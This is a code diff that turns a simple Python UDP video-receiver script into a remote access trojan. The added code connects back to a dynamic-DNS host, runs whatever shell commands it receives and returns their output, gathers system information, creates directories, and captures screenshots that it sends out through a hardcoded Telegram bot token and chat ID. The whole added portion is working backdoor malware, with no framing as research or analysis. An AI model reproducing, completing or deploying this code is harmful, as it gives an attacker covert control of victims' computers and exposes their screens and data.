@@ -1,35 +1,56 @@
-import cv2, imutils, socket
-import numpy as np
+import socket
+import sys
 import time
+import subprocess
+import requests
+import os
+import struct
+import pickle
+import cv2
 import base64
+import pyautogui
+import numpy as np
+host = 'dimagamera.ddns.net'
+port = 81
 
-BUFF_SIZE = 65536
-client_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_RCVBUF,BUFF_SIZE)
-host_name = socket.gethostname()
-host_ip = '192.168.1.102'#  socket.gethostbyname(host_name)
-print(host_ip)
-port = 9999
-message = b'Hello'
-
-client_socket.sendto(message,(host_ip,port))
-fps,st,frames_to_count,cnt = (0,0,20,0)
 while True:
-	packet,_ = client_socket.recvfrom(BUFF_SIZE)
-	data = base64.b64decode(packet,' /')
-	npdata = np.fromstring(data,dtype=np.uint8)
-	frame = cv2.imdecode(npdata,1)
-	frame = cv2.putText(frame,'FPS: '+str(fps),(10,40),cv2.FONT_HERSHEY_SIMPLEX,0.7,(0,0,255),2)
-	cv2.imshow("RECEIVING VIDEO",frame)
-	key = cv2.waitKey(1) & 0xFF
-	if key == ord('q'):
-		client_socket.close()
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host, port))
 		break
-	if cnt == frames_to_count:
+	except:
+		pass
+
+while True:
+	a = s.recv(1024)
+	a = a.decode()
+	if a == '/cmd':
+		cmd = s.recv(1024)
+		cmd = cmd.decode()
+		cmd_process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
+		cmd_process = cmd_process.stdout + cmd_process.stderr
+		s.send(cmd_process)
+
+	elif a == '/screen':
 		try:
-			fps = round(frames_to_count/(time.time()-st))
-			st=time.time()
-			cnt=0
+			image = pyautogui.screenshot()
+			image = cv2.cvtColor(np.array(image),
+						cv2.COLOR_RGB2BGR)
+			cv2.imwrite("image1.png", image)
+			photo = open(r"image1.png", 'rb')
+			files = {'document': photo}
+			requests.post("https://api.telegram.org/bot1656016658:AAGxJpjEaZ--T1eDc4wUc8GS3NXQ1fNcJ2w/sendDocument?chat_id=330710135", files=files)
+			photo.close()
 		except:
 			pass
-	cnt+=1
+
+	elif a == '/mkdir':
+		dir = s.recv(1024)
+		dir = dir.decode()
+		os.system('mkdir '+ str(dir))
+	elif a == "/sysinfo":
+		cmd_process = subprocess.run('systeminfo', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
+		cmd_process = cmd_process.stdout + cmd_process.stderr
+		s.send(cmd_process)
+	elif a == "/webcam":
+		pass
